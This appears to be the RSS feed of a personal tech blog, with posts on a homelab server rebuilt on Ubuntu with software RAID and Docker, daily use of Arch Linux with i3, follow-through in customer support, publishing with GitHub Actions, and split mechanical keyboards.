+<p>The server rebuild is probably one of the bigger things here. While I was already hosting VMs and Docker containers on this box when it was running Windows, it was unreliable at best thanks to forced updates/reboots in Windows 10. Sigh. I rebuilt this server on Ubuntu 20.04 LTS and haven&rsquo;t regretted it for a second. Resource utilization is super low, so I can run more stuff on it (also playing around with Jellyfin now), and since it&rsquo;s Linux the Docker support is significantly better (obviously) so I&rsquo;ve been able to completely do away with any VM-based workloads.</p>
+<p>Next up in technical significance is the DS918 NAS. What a game changer coming from my old NetGear NAS! Bonded 1Gbit NICs for super fast transfers, Docker support (so I&rsquo;ve got my failover PiHole server hosted here now), and built-in applications for cloud sync so I can also automate all of my offsite backups of critical data. Worth every cent, and despite my best efforts I still haven&rsquo;t even broken 50% utilization of the disk space I put into it!</p>
+<p>The UPS and network switch are purely utilitarian. The UPS is connected to my server via USB so I can script a shutdown sequence if it&rsquo;s anything more than a momentary outage, but beyond that this will keep my whole network up and running for about 90 minutes in the event of a powerloss. Great in case I&rsquo;m in the middle of a meeting! The switch is just an upgrade over my full 8-port switch that was in use previously&hellip; may move to a PoE switch soon though&hellip; been eyeing another new AP!</p>
+]]></content></item><item><title>Publish articles with GitHub Actions</title><link>https://maclarel.github.io/posts/2021-11/actions/</link><pubDate>Sat, 13 Nov 2021 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2021-11/actions/</guid><description>Well, that was easier than expected. Take a look at peaceiris' actions-hugo repository for a workflow that can automate Hugo builds with all sorts of configurations.
+I was expecting this project to take about an hour of tinkering, but it wound up taking under 5 minutes. Hooray!</description><content type="html"><![CDATA[<p>Well, that was easier than expected. Take a look at <a href="https://github.com/peaceiris/actions-hugo">peaceiris' <code>actions-hugo</code> repository</a> for a workflow that can automate Hugo builds with all sorts of configurations.</p>
+<p>I was expecting this project to take about an hour of tinkering, but it wound up taking under 5 minutes. Hooray!</p>
+]]></content></item><item><title>I still use Arch, btw</title><link>https://maclarel.github.io/posts/2021-11/still_use_arch/</link><pubDate>Thu, 11 Nov 2021 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2021-11/still_use_arch/</guid><description>Yep, the meme lives on. Still getting by with Arch as a daily driver. Still running it through VirtualBox.
+What&amp;rsquo;s great? Full control, and amazingly lightweight. Booted, and with my WM (i3) running, I&amp;rsquo;m measuring &amp;lt; 300MB of RAM usage and virtually zero CPU/disk usage. Windows or Mac OS sitting idle&amp;hellip; yeah, not comparable. Itg&amp;rsquo;s very refreshing having full control over just about every aspect of what I want.
+I&amp;rsquo;m getting so used to using i3, with only extremly minor modifications to bindings, that I&amp;rsquo;ve actually updated a lot of my Amethyst bindings to align with i3 defaults.</description><content type="html"><![CDATA[<p>Yep, the meme lives on. Still getting by with Arch as a daily driver. Still running it through VirtualBox.</p>
+<h1 id="whats-great">What&rsquo;s great?</h1>
+<p>Full control, and amazingly lightweight. Booted, and with my WM (i3) running, I&rsquo;m measuring &lt; 300MB of RAM usage and virtually zero CPU/disk usage. Windows or Mac OS sitting idle&hellip; yeah, not comparable. Itg&rsquo;s very refreshing having full control over just about every aspect of what I want.</p>
+<p>I&rsquo;m getting so used to using i3, with only extremly minor modifications to bindings, that I&rsquo;ve actually updated a lot of my Amethyst bindings to align with i3 defaults. It&rsquo;s just plain intuitive. Similarly, having a WM that&rsquo;s heavily keyboard driven, combined with qutebrowser and/or the Vimium extension in other browsers, makes it so that my hands rarely need to leave my keyboard. Obviously there are still some reasonably keyboard-unfriendly scenarios (<em>glances at Google sites</em>), but beyond that it&rsquo;s a pretty fantastic experience.</p>
+<p>I will note that I really haven&rsquo;t tried gaming in this at all. I haven&rsquo;t poked at GPU passthrough, and there&rsquo;s really no point in even trying with the vGPU that VirtualBox provides. I <em>did</em> get gzdoom running, but it was like a slideshow. Regardless, I&rsquo;ve got Wintendo for that.</p>
+<h1 id="whats-just-ok">What&rsquo;s just OK?</h1>
+<p>Now I&rsquo;m going to preface this by noting that I know I&rsquo;m not doing myself any favours by 1) using Arch, and 2) not using a major DE like Plasma.</p>
+<p>The only thing that is really, really painful coming from Windows/MacOS is the lack of a reliable clipboard system without having to get something setup. Yes, I know that I&rsquo;m getting <em>exactly</em> what I asked for, but I&rsquo;m still going to complain as it&rsquo;s really my only complaint &lt;_&lt;</p>
+<p>This is of course something I&rsquo;ll get around to addressing, but I had to bitch :P</p>
+<h1 id="what-sucks">What sucks?</h1>
+<p>VirtualBox has some annoying bugs, and &ldquo;features&rdquo;, but not in ways that actually break things. Some minor annoyuances include:</p>
+<ul>
+<li>Sometimes, but only sometimes, audio in my VM will get heavily distorted or &ldquo;poppy&rdquo;. The only workaround is to relaunch VirtualBox. Even restoring the VM from a snapshot doesn&rsquo;t reproduce it, so this feels like something with the hypervisor rather than the Guest.</li>
+<li>Despite being in full-screen mode, with no way to escape the guest short of ctrl-alt-f, there are still other key combinations that will escape the guest&hellip; Most notably among these chorgs is Super-L which of course is a default in my WM, but every f&amp;*king time I hit it to move a window around it locks my machine (via Windows). Need to figure that out still&hellip;</li>
+</ul>
+<h1 id="so-whats-next">So what&rsquo;s next?</h1>
+<p>Well, in my current work position I can&rsquo;t actually use Linux as my full time daily driver <em>however</em> I have already moved all of my personal work over to it and LOVE it. Significantly less friction than trying to work on projects through WSL, fewer annoyances than using MacOS and its menagerie of ancient/outdated packages and lack of customization, and my fingers would fall off trying to outline all the reasons that I prefer it over working directly in Windows.</p>
+<p>I guess this is all to say that despite running Windows under the covers, I have been, and will still be, spending more time in Linux than what&rsquo;s actually powering it. I&rsquo;m OK with that for now. It&rsquo;ll be interesting to see where Win 11 goes. I wouldn&rsquo;t mind taking the full jump over to Linux, but it will likely always be as a dual-boot as when I game I don&rsquo;t want to have to tinker.</p>
+]]></content></item><item><title>Relentless follow-through in Support</title><link>https://maclarel.github.io/posts/2021-11/expectations/</link><pubDate>Mon, 08 Nov 2021 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2021-11/expectations/</guid><description>Way back in April 2020 I wrote an article called Written communication for support which covered some high level best practices around setting, managing, and resetting expectations. Think of this as a spiritual successor to that article, as we&amp;rsquo;re going to talk about the other side of the coin - relentless follow-through.
+To put &amp;ldquo;relentless follow-through&amp;rdquo; in more direct terms, I want to discuss some best practices around timeliness of responses even when there&amp;rsquo;s no news, internal follow-up and expectation setting, and some options for collaboration (depending on the size/maturity of your business).</description><content type="html"><![CDATA[<p>Way back in April 2020 I wrote an article called <a href="../../2020-04/written-communication-for-support/">Written communication for support</a> which covered some high level best practices around setting, managing, and resetting expectations. Think of this as a spiritual successor to that article, as we&rsquo;re going to talk about the other side of the coin - relentless follow-through.</p>
+<p>To put &ldquo;relentless follow-through&rdquo; in more direct terms, I want to discuss some best practices around timeliness of responses <em>even when there&rsquo;s no news</em>, internal follow-up and expectation setting, and some options for collaboration (depending on the size/maturity of your business).</p>
+<h1 id="relentless-sounds-like-a-strong-word">Relentless sounds like a strong word&hellip;</h1>
+<p>It is.</p>
+<p>While I don&rsquo;t remember the exact etymology of this phrase, this is something that was said to me early in my career and it really stuck. Frankly, regardless of <em>technical</em> skill, I&rsquo;d argue that the ability to effectively manage expectations and follow-through on commitments is the single most important aspect of success for anyone customer facing. This comes with a <em>lot</em> of &ldquo;gotchas&rdquo; though.</p>
+<ul>
+<li>How do you know what you&rsquo;re saying is true or realistic?</li>
+<li>How can you advise on timelines?</li>
+<li>What other resources (human or otherwise) can you leverage?</li>
+</ul>
+<p>We&rsquo;ll deconstruct a few of these, but before we get to those I want to try to sum up this entire concept in one paragraph in case we hit a TL;DR situation:</p>
+<p><em>Your ability, as a support engineer, to keep your customers informed of the progress of investigations is paramount. In terms of customer satisfaction this is often more important than the actual time to resolution.</em></p>
+<h2 id="setting-realistic-expectations">Setting realistic expectations</h2>
+<p>Without rehashing too much content in the other article, the key point I want to get across here is that it doesn&rsquo;t help to bullshit people. I&rsquo;m not suggesting airing dirty laundry, or providing exhaustive detail, but if something flat out cannot be done it doesn&rsquo;t help to imply that it might be. Similarly, it&rsquo;s not overly helpful to imply that extremely minor (low visibility/low impact) bugs will get fixed quickly. There are some wording techniques to help get around these, and that will help convey this messaging in a more subtle fashion.</p>
+<pre><code>Sorry to hear that you're running into &lt;Issue X&gt;. We've been able to confirm this as a bug here, and are following up with our teams internally to work on a fix. I can't advise on when, we'll be able to deliver a fix for this problem, however I'd suggest keeping an eye on our release notes where a fix would be advertised.
+
+In the mean time, we'd suggest the following workaround to help mitigate this issue in your usage:
+
+1. 
+2.
+3.
+etc....
+
+Please let us know if you have any further questions!
+</code></pre><p>The wording here is strategic in a few ways:</p>
+<ul>
+<li>The issue in question is specifically called out and acknowledged.</li>
+<li>Ownership of the problem has been transferred to another <em>non-customer facing</em> organization.</li>
+<li>Expectations are set that a fix may never materialize, or at the very least may not be prioritized.</li>
+<li>The customer is provided with information on how they can see progress.</li>
+<li>A workaround is offered to help mitigate their business impact.</li>
+</ul>
+<p>Five key factors in, effectively, two lines of text.</p>
+<p>Building on this, you may also find yourself working in positions where you&rsquo;re working extremely closely with customers and have relationships <em>with them</em> that you can leverage. Often, issues will be exaggerated or at the very least not fully understood by the people reporting them. When you&rsquo;ve got this level of access, especially in a real-time fashion, it can be extremely helpful to spend a few minutes dissecting the actual problematic use-case to understand both if it&rsquo;s a realistic scenario, and whether or not it&rsquo;s something that&rsquo;s worth everyone&rsquo;s time to follow up on.</p>
+<p>As an example, you may receive a ticket like this:</p>
+<pre><code>Hi Support, 
+
+X part of the UI is broken in your product. This is blocking critical workflows on our side. See attached.
+</code></pre><p>A few helpful questions to ask to start (either in your own head, or to the customer):</p>
+<ul>
+<li>Is the only way to do what they&rsquo;re trying to do (i.e. is this actually blocking work)?
+<ul>
+<li>Note: This is two-fold - both helps clarify the priority of the issue, as well as your ability to offer alternatives.</li>
+</ul>
+</li>
+<li>Is this problem actually a problem, or is it &ldquo;working as intended&rdquo; and unlikely to be &ldquo;fixed&rdquo;?</li>
+<li>Does the person reporting the problem fully understand the scenario, or are they just relaying information?</li>
+</ul>
+<p>If you find that the answer to most, or all, of these questions is &ldquo;No.&rdquo; there&rsquo;s ample opportunity here to have a discussion with the complaining party about what&rsquo;s realistic to deliver on and to negotiate a proper prioritization for both you <em>and</em> them as they&rsquo;ll also have stakeholders to report back to.</p>
+<h2 id="managing-timelines">Managing timelines</h2>
+<p>This is a very tricky one in the Support world, and I don&rsquo;t want to imply that you&rsquo;ll ever have much control over it given the interrupt-driven nature of the work and heavy reliance on other parts of your organization. Despite the lack of control over the <em>technical outcome</em> in some scenarios, this is also the concept at the very core of &ldquo;relentless follow-through&rdquo;.</p>
+<p>At a high level, this is your time to set the cadence for <em>standing</em> communication and by that I mean the pace of communication <em>when there is nothing actionable to provide to the customer</em>. As a side note - some companies address through this &ldquo;next response SLAs&rdquo;, which I&rsquo;d generally argue are overly aggressive and detract from quality, but you may see that come up. I&rsquo;d generally suggest setting the expectation <em>and delivering on it</em> of an update <em>at least</em> every two business days outlining current status. Working on an investigation that has been escalated to engineering and haven&rsquo;t heard back? No problem, note that the investigation is still ongoing and you&rsquo;ll provide another update on status before end-of-day two days from then. Haven&rsquo;t had a chance to look at an issue that&rsquo;s in your ballpark to address? Same deal, &ldquo;apologies, still investigating&rdquo;, etc&hellip;</p>
+<p>Similarly, you&rsquo;ll generally want to use a similar cadence for issues where you&rsquo;re reliant on someone else to provide you with an update. Escalation with engineering? Ping them every 2 days (or more often depending on issue impact). Waiting to hear back from your real estate agent? Ping them every 2 days. This is something applicable well beyond just the world of Support, and I think you&rsquo;ll find it helpful in just about any aspect of life. Similarly, I think you&rsquo;ll get a solid realization of when other people are doing it&hellip; and when they <em>aren&rsquo;t</em>.</p>
+<p>Realizing that I just provided seemingly trivial examples following a statement about how tricky this is, that&rsquo;s intentional. The actual <em>execution</em> of this concept is also trivial, yet this is the <em>number one</em> reason I&rsquo;ve seen for escalations in any support organization I&rsquo;ve worked at. Customers are left wondering as to what the status of their investigation is, or why it hasn&rsquo;t progressed, or why they haven&rsquo;t heard back on questions they&rsquo;ve asked. Obviously if things are dragging on for extreme periods of time there will be some legitimate frustration, but this sort of communication technique <em>and cadence</em> will generally curb a significant majority of non-technical escalations.</p>
+<h2 id="leveraging-others">Leveraging others</h2>
+<p>While this may seem like the basics of working on any sort of team, this is intentionally last in my list as both of the topics above play directly into this. I&rsquo;m not going to spend a significant amount of time on this point, either, as it&rsquo;s always going to be subjective. I&rsquo;ll leave it simply by stating that the relationships/connections you build within your team/company/customers are <em>almost always</em> going to be your most valuable asset in terms of delivery. Short of extremely simplistic products, it is virtually impossible for an individual to be an expert on <em>everything</em> - your ability to know who to ask <em>and to leverage your relationship with them</em> to get a timely response/deeper understanding will pay dividends even beyond the scope of an individual job.</p>
+<h1 id="this-all-sounds-so-simple">This all sounds so simple</h1>
+<p>It does, and in some respects it is. The biggest challenge around all of this is the mindset shift to fit within it and the actual execution on a consistent basis. It may seem counterintuitive to send someone an update saying that there&rsquo;s no update, or to nag someone that you trust is doing the best they can, however in both cases it demonstrates <em>your</em> investment in the situation and that in all regards nothing, and no one, has been forgotten about.</p>
+]]></content></item><item><title>I use Arch, btw</title><link>https://maclarel.github.io/posts/2021-10/arch_btw/</link><pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2021-10/arch_btw/</guid><description>I use Arch, btw I&amp;rsquo;ve been using Linux for ages, nearly two decades at this point. I actually dug out my old Mandrake and Slackware CDs while going through a box in my basement the other day&amp;hellip; quite the flashback.
+Despite that tenure on at least some of the hardware I&amp;rsquo;ve owned at any given time, I&amp;rsquo;ve never really used it as a daily driver for desktop usage. That changed today when I finally sat down and set up Arch, complete with forgetting to install a boot loader, on my main rig.</description><content type="html"><![CDATA[<h1 id="i-use-arch-btw">I use Arch, btw</h1>
+<p>I&rsquo;ve been using Linux for ages, nearly two decades at this point. I actually dug out my old Mandrake and Slackware CDs while going through a box in my basement the other day&hellip; quite the flashback.</p>
+<p>Despite that tenure on at least some of the hardware I&rsquo;ve owned at any given time, I&rsquo;ve never really used it as a daily driver for <em>desktop</em> usage. That changed today when I finally sat down and set up Arch, complete with forgetting to install a boot loader, on my main rig.</p>
+<p>One catch though&hellip; I did it in Virtual Box.</p>
+<h1 id="but-its-in-a-vm">But it&rsquo;s in a VM</h1>
+<p>Yeah, yeah, yeah. I know. I&rsquo;d prefer to have it on bare metal as well, however my main passtime outside of tinkering with technology is playing WoW Classic. At first you may think &ldquo;Ok, that definitely runs under Wine/Proton, right?&rdquo; and yes, it does, but Blizzard also has a long history of banning Linux gamers for perceived cheating, &ldquo;using an unsupported operating system&rdquo;, or any other number of non-sensical reasons.</p>
+<p>In any case, that has kept me using Windows as the main OS installed on bare metal. Flip side, Virtual Box has come a long way and is exceptionally good for virtualizing a desktop OS - especially when compared to Hyper-V which I was using previously.</p>
+<p>All that to say, I&rsquo;ve been working out of i3 on Arch all day despite it running in a VM and the only thing it has made me want to do is quit WoW so I can just use this without any additional overhead. It&rsquo;s wonderful.</p>
+<h1 id="how-did-the-setup-go">How did the setup go?</h1>
+<p>The Arch Wiki&rsquo;s installation guide is reasonably good, though like all things Arch it expects you to do a fair bit of research for yourself. If you haven&rsquo;t toyed around with Arch before, or at least don&rsquo;t have a very good understanding of how to do things like manually configure a network interface from scratch, I&rsquo;d suggest against doing this for your first time unless you&rsquo;re into learning-by-doing (like I am).</p>
+<p>I&rsquo;ve dabbled with Gentoo in the past, and this is nowhere near that level of confusing to setup, but it&rsquo;s still not a pretty GUI like you&rsquo;ll get with Ubuntu or Pop, etc&hellip; That said, that didn&rsquo;t really factor into my decision.</p>
+<p>I had a few hiccups during installation, mostly due to not quite understanding what I was getting &ldquo;for free&rdquo; with the installation vs what was running on the live disk I used for the installation. This meant that I had to spend a good 30-45 minutes figuring out all of the packages I needed to get my networking functional (I ended up using <code>networkd</code> for the sake of having it in line with my other boxen). Beyond that, though, was an infuriating 90 minute stretch of trying to get i3 to work&hellip;</p>
+<p>i3 relies on <code>i3-config-wizard</code> to do the initial configuration file creation to actually be able to start i3, however <em>that wizard requires X to be running despite still being a text interface</em> which is beyond bizarre. It wasn&rsquo;t until I got xmonad running (and realizing that it wasn&rsquo;t for me) that I was able to actually get i3 configured and working. Haven&rsquo;t looked back since. After coming from a lot of tinkering with Amethyst, DisplayFusion, Yabai, and other &ldquo;window managers&rdquo; on Windows and MacOS, having something like i3 and it&rsquo;s integration with Xorg is&hellip; well, mindblowing. Full control over everything. It&rsquo;s perfect.</p>
+<p>Without getting into the religious debates of what WM is the best, least bloated, etc&hellip; This is a fantastic example of the type of freedom you can get when you move away from Windows/MacOS and into an ecosystem that&rsquo;s literally built around user choice and flexibility. I&rsquo;ve never been one to enjoy playing within the rules, and now I truly don&rsquo;t have to.</p>
+<h1 id="hows-it-going">How&rsquo;s it going?</h1>
+<p>I&rsquo;ll do another post in a few weeks to recap using Arch + i3 as a daily driver for that period of time, but initial impressions are exclusively positive.</p>
+<p>My experience of using Linux as a desktop OS in the past were mostly sullied by my own choices (Slackware as a daily driver? Eep!) or lack of knowledge at the time&hellip; but hey, that&rsquo;s how you learn. With the readily available knowledge between Wikis, colleages, friends, and Reddit it&rsquo;s now somewhat trivial to find answers to questions that would have taken weeks to sort out on IRC or forums (though I still enjoy both).</p>
+<p>As an aside, the workspace approach here (and more importantly being able to trivially hotkey windows over to specific workspaces) is a game changer after coming from Windows/MacOS. I know that can all be done through various ways there as well, and I use those approaches, but it&rsquo;s <em>seamless</em> in i3 (and I&rsquo;m sure many other WMs). I love it.</p>
+<p>Coming over from MacOS for work purposes, and Windows for personal projects, this is also a breath of fresh air. I&rsquo;ve got control over what&rsquo;s running, resource utilization is way down, and things are just much&hellip; snappier. Despite running this in a VM (and one that only has access to 1/3 my system resources) it is <em>vastly</em> more responsive than Windows 10 is on my beast or a PC, or MacOS on my max-spec 2019 MBP. It&rsquo;s really quite mind-boggling what I was living with, and how much better it could have been&hellip; despite running exactly the same applications!</p>
+<p>The other thing that&rsquo;s of course beneficial here is that nearly all of my projects are based around stuff that just better works on Linux anyway. I don&rsquo;t need to deal with MacOS shipping with GNU Utils that are decades out of date, or the bizarre setup that is WSL (though WSL is still pretty cool!) - I&rsquo;ve got the latest and greatest at my fingertips, and nothing to get in the way of my work&hellip; only the things that I&rsquo;ve chosen to pull in to <em>support</em> my work. Is this&hellip; freedom?</p>
+<h1 id="whats-next">What&rsquo;s next?</h1>
+<p>Current things for me to tweak/understand:</p>
+<ul>
+<li>Can I get any GPU passthrough configured for this, and do I even need/want to? Performance is great for any non-gaming, and I can just pop out to Windows for that.</li>
+<li>Play around with some more i3 config to get tiling layout just how I want it, and align keybinds with what I&rsquo;m using on my other systems to limit context switching.</li>
+<li>Play around with i3 gaps for a sexier layout, though I am loving the completely efficient use of space that i3 is giving me so far.</li>
+</ul>
+]]></content></item><item><title>Server Rebuild</title><link>https://maclarel.github.io/posts/2021-05/server_rebuild/</link><pubDate>Sun, 16 May 2021 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2021-05/server_rebuild/</guid><description>What did I do? Half fueled by beer, and half by a playlist of keygen tracks, I decided that it would be a good idea to finally getting around to rebuilding my long-lived server&amp;hellip; No more Windows and its infuriating forced updates (which you used to be able to override), lack of clear/consistent OS level event scripting for integration with my UPS, or garbage-tier support from Docker. I wanted something that I&amp;rsquo;d finally have the level of control I wanted for something that backs pretty much eveverything I use outside of work.</description><content type="html"><![CDATA[<h1 id="what-did-i-do">What did I do?</h1>
+<p>Half fueled by beer, and half by a playlist of keygen tracks, I decided that it would be a good idea to finally getting around to rebuilding my long-lived server&hellip; No more Windows and its infuriating forced updates (which you used to be able to override), lack of clear/consistent OS level event scripting for integration with my UPS, or garbage-tier support from Docker. I wanted something that I&rsquo;d finally have the level of control I wanted for something that backs pretty much eveverything I use outside of work.</p>
+<h1 id="why-did-i-do-it">Why did I do it?</h1>
+<p>There were a few things, eluded to above, that really drove this:</p>
+<ul>
+<li>Alcohol</li>
+<li>&ldquo;I&rsquo;ve done this a million times, it&rsquo;ll only take 2 hours tops&rdquo;</li>
+<li>A need for better scripting around UPS status</li>
+<li>A need to avoid repeat downtime due to forced OS updates/reboots</li>
+<li>Really inefficient memory usage on the server due to poor Docker support, pushing me to VMs for several usecases</li>
+<li>With Docker on Windows, there was (is?) no way to expose network shares to containers, so I was forced even more over to VMs</li>
+<li>I was sick and tired of needing to use an RDP client to manage my server when I could just be scripting things instead</li>
+</ul>
+<h1 id="prep-work">Prep work</h1>
+<p>Arguably the largest amount of work here was ensuring that I had all of my configs and persistent data backed up so that it would survive the migration. My old setup was using Hyper-V and Docker backed on a software RAID array - more on the RAID setup later, as it was annoying - so I wanted to get all of that data somewhere that I could either mount it and access it, or easily rebuild it. For the most part, this was just wrangling config files out of VMs and moving them over to my NAS or <a href="https://github.com/maclarel/homelab">repo</a> so that I could pull them later.</p>
+<p>Next up was planning out the build, partition schemes and all. My server had three main volumes originally:</p>
+<ul>
+<li>256GB SSD</li>
+<li>1TB RAID-1</li>
+<li>500GB HDD</li>
+</ul>
+<p>I didn&rsquo;t want to waste time ever dual booting as there was simply no reason to for a machine that lives in my closet, so I split up the SSD as follows (leaving some extra space if I need to grow any partition later):</p>
+<pre><code>/ 30g
+/home 50g
+/data 130g
+/swap 4g
+</code></pre><p>I&rsquo;m not sold on the <code>swap</code> ever being useful, but it&rsquo;s there. I had many occasions on Windows where I would run out of memory due to ridiculous memory leaks with WSL/Docker, so I figured better safe than sorry. Based on what I&rsquo;m seeing so far&hellip; this really wasn&rsquo;t needed.</p>
+<p>The <code>/data</code> partition is there simply if I need it for apps requiring high disk performance, but so far Plex is quite happy running off of the RAID array and pulling data from my NAS. This may wind up just sitting idle. Similarly, not much use for <code>/home</code>. This split was really just so if I ever wanted to reinstall the OS I could maintain those partitions without losing data.</p>
+<p>Everything else in terms of data access was just understanding how to mount my shares, and that was pulled from my existing VMs.</p>
+<p>With my data set aside, I was ready to move forward&hellip;</p>
+<h1 id="the-reinstall">The reinstall</h1>
+<p>Well, installing Ubuntu Server is as braindead as it ever has been. Zero drama there.</p>
+<p>Once that was online, I tried to mount my NTFS drives only to find two surprises:</p>
+<ol>
+<li>I could mount my Windows RAID array and read the data, yay!</li>
+<li>I could only mount the NTFS partitions in read-only because the filesystems had apparently been corrupted by an earlier reboot during startup&hellip; Joy.</li>
+</ol>
+<p>Fortunately, I had backups of any data I needed, so no real issue there, but it did mean that I needed to rebuild these. It turns out creating a software RAID on Linux is pretty braindead as well:</p>
+<pre><code>parted -a optimal /dev/sda mklabel gpt
+parted -a optimal /dev/sda mkpart primary btrfs 0% 100%
+parted -a optimal /dev/sda set 1 raid on
+parted -a optimal /dev/sda print
+
+parted -a optimal /dev/sdb mklabel gpt
+parted -a optimal /dev/sdb mkpart primary btrfs 0% 100%
+parted -a optimal /dev/sdb set 1 raid on
+parted -a optimal /dev/sdb print
+
+mdadm --create /dev/md0 --level=1 --raid-devices=2 /dev/sd[ab]1
+mdadm --detail /dev/md0
+mdadm --examine /dev/sd[ab]1
+
+mkfs.btrfs /dev/md0
+
+mount /dev/md0 /mnt/tesla
+</code></pre><p>From there, it was just a matter of adding it to <code>/etc/fstab</code> and I was off to the races. Same for my network shares. Easy stuff.</p>
+<p>Moving over <code>nginx</code> and <code>pihole</code> was trivial, and in fact somewhat improved, as they were both Docker based anyway.</p>
+<p>Now the fun part - moving my &ldquo;Linux ISO gathering&rdquo; setup (torrent box + vpn) and Plex over to Docker. I decided to start with Plex - pretty much zero drama there, plug &amp; play with <code>plexinc/pms-docker</code> though I did have to rebuild my library and unregister the old (now duplicate) server.</p>
+<p>qBittorrent though, that was a challenge. Let&rsquo;s talk about that.</p>
+<h1 id="challenges">Challenges</h1>
+<p>Originally, I was running qBittorrent in a VM so that I could send all of my network traffic out through my VPN provider without needing to impact the host&rsquo;s networking, but this meant maintaining a VM just for this purpose. I originally went this way after the rebuild on Ubuntu Server but I&rsquo;m going to be frank in saying that qemu/kvm are miserable to manage from command line, and I had no interest in setting up an X env to use virtman or anything else&hellip; I was just going to figure it out with Docker.</p>
+<p>Through this, I found <code>https://github.com/tprasadtp/protonvpn-docker</code> which is great - proxied networking through a container running the VPN, and container level reliance on things running. This still had some problems that I had to address through.</p>
+<ol>
+<li>The relative container reliance offered through docker-compose just means the other container has to be up, not that the VPN needed to be operational.</li>
+<li>The VPN &ldquo;kill switch&rdquo; functionality is unreliable at best in the container world.</li>
+<li>With the VPN connected, I&rsquo;d <a href="https://github.com/tprasadtp/protonvpn-docker/issues/15#issuecomment-841824116">lose all LAN connectivity to the server I was trying to expose</a>.</li>
+</ol>
+<p>I was able to sort out the LAN issue in the Issue linked above, fortunately, but definitely burned a few hours there playing around with different ways to pass in custom <code>ip route</code> commands. Fortunately, the VPN client already handles this for me and the author of that container already exposed the functionality. It took some hunting to figure out, but it&rsquo;s now working. Awesome, now let&rsquo;s figure out a kill switch!</p>
+<p>If you&rsquo;re unfamiliar with the VPN &ldquo;kill switch&rdquo;, it&rsquo;s basically a way to ensure that no network traffic hits the internet from the machine in question if the VPN connection goes down. The VPN I&rsquo;m using does this through managing IPTables rules, however this allows a brief gap where traffic can still slip out when used in a container setting. With rapid reconnects this isn&rsquo;t a huge problem, but better to just not have that surface anyway. I was eventually able to deal with this by forcing the client (<code>qBittorrent</code>) to bind to the VPN&rsquo;s network interface in the VPN container. This interface is ephemeral, but consistently named - if the VPN goes down, the client drops ALL connections as it no longer has a network interface at all, and when it comes back up it detects it and rebinds. This isn&rsquo;t as glorious as using some dedicated routing for it, but it works and is (at this point) more reliable than the kill switch.</p>
+<h1 id="where-did-it-all-land">Where did it all land?</h1>
+<p>This brings me to where I am now. The server is up, I no longer have a single VM running (everything is in Docker), and I can manage everything from an SSH client on my phone. It&rsquo;s pretty much ideal. Functionality aside though&hellip; this actually saves me money.</p>
+<p>When I was running these workloads on Windows, due to the VM reliance, I was consistently using 10-11GB of my 16GB RAM. With this setup on Linux, I&rsquo;m now using <em>less than 1.5GB</em>, or an 85% reduction in resource usage. I&rsquo;ve gone from trying to source another 16GB of RAM, to wondering what I&rsquo;m going to do with all the extra resources I now have at my disposal.</p>
+<p>More to come, I&rsquo;m sure, as well as likely no end to problems, but this has been a fun ~2~ 10 hour project, and I am damn happy with the results at this point!</p>
+]]></content></item><item><title>Keyboard ascension</title><link>https://maclarel.github.io/posts/2021-05/keebs/</link><pubDate>Sat, 01 May 2021 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2021-05/keebs/</guid><description>Keebs Mechanical keyboards, sometimes calld keebs, come up from time to time as a bit of a meme. &amp;ldquo;Oh, you&amp;rsquo;ve got one of those loud keyboards.&amp;rdquo; or &amp;ldquo;Why on earth did you spend $500 ona a keyboard that does the same thing as the $5 one I got from Office Depot?&amp;rdquo;.
+I&amp;rsquo;ll say that, for the really cheap end of the spectrum with mechanical keyboards, this really is a meme that holds up.</description><content type="html"><![CDATA[<h1 id="keebs">Keebs</h1>
+<p>Mechanical keyboards, sometimes calld keebs, come up from time to time as a bit of a meme. &ldquo;Oh, you&rsquo;ve got one of those <em>loud</em> keyboards.&rdquo; or &ldquo;Why on earth did you spend $500 ona a keyboard that does the same thing as the $5 one I got from Office Depot?&rdquo;.</p>
+<p>I&rsquo;ll say that, for the really cheap end of the spectrum with mechanical keyboards, this really is a meme that holds up. A cheap mechanical keyboard is really not going to be a huge difference from whatever you got with your prebuilt machine. Somewhat depressingly, however, I&rsquo;ll note that &ldquo;cheap&rdquo; here really means a budget of under $200 USD&hellip;</p>
+<p>This is largely going to be talking about split keyboards, too. While there are <em>very</em> nice traditional layout (108 key, TKL, 65%, whatever) mechanical keyboard builds, I think the real value is with a split setup if you spend any considerable amount of time typing.</p>
+<h1 id="why-you-should-care">Why you should care</h1>
+<p>&ldquo;Yeah, yeah, yeah I&rsquo;m not some 1337 h4x0r, why would I care about my keyboard?&rdquo; you may ask&hellip; Well, neither am I. In fact, I spend a significant majority of my time writing - documentation, bug reports, general communication, etc&hellip; Working remotely, typing as a form of communication is pretty easily 6+ hours of my day on any given day.</p>
+<p>I&rsquo;m betting that if you work at a computer, that number is probably similar for you as well. Are you shitposting on Slack or Discord? Are you writng emails? Are you building out team plans? There&rsquo;s a good chance that a bulk of your time is spent typing if you&rsquo;re doing those things. Certainly, if you&rsquo;re coding for a living you&rsquo;ll also fall under this umbrella.</p>
+<p>So, do yourself a favour here. Take note of your current posture. I&rsquo;ll bet that if your hands are on your keyboard that you&rsquo;re slouched over a bit, wrists are at a somewhat weird angle, and if your setup isn&rsquo;t otherwise ergonomically sound you probably have a fair bit of weight on your forearms or elbows. Now, take your keyboard and move it so that the home row for your left hand (e.g. ASDF on a QWERTY layout) is positioned such that your arms is positioned for shoulder width - your upper arm is in line with your body, and your forearm makes a 90 degree angle off of that. No more pressure on your arms, no more awkward wrist angle, no more hunch&hellip; Magical, huh?</p>
+<p>This is where a split keyboard comes into the mix.</p>
+<h1 id="going-down-the-rabbit-hole">Going down the rabbit hole</h1>
+<p>I&rsquo;ve gone through many keyboards over the past couple of decades, of many types&hellip; and mostly crap. I used a cheap Logitech keyboard/mouse combo for quite a while until I learned about NKRO, at which point I moved to.. another crappy Logitech keyboard (a G15) which I thought was the bee&rsquo;s knees. From there, I got into mechanical keyboards with a Steelseries 7g and at that time I was blown away - great NKRO, responsive switches, a nice noise, and no gummy feel. I was hooked!</p>
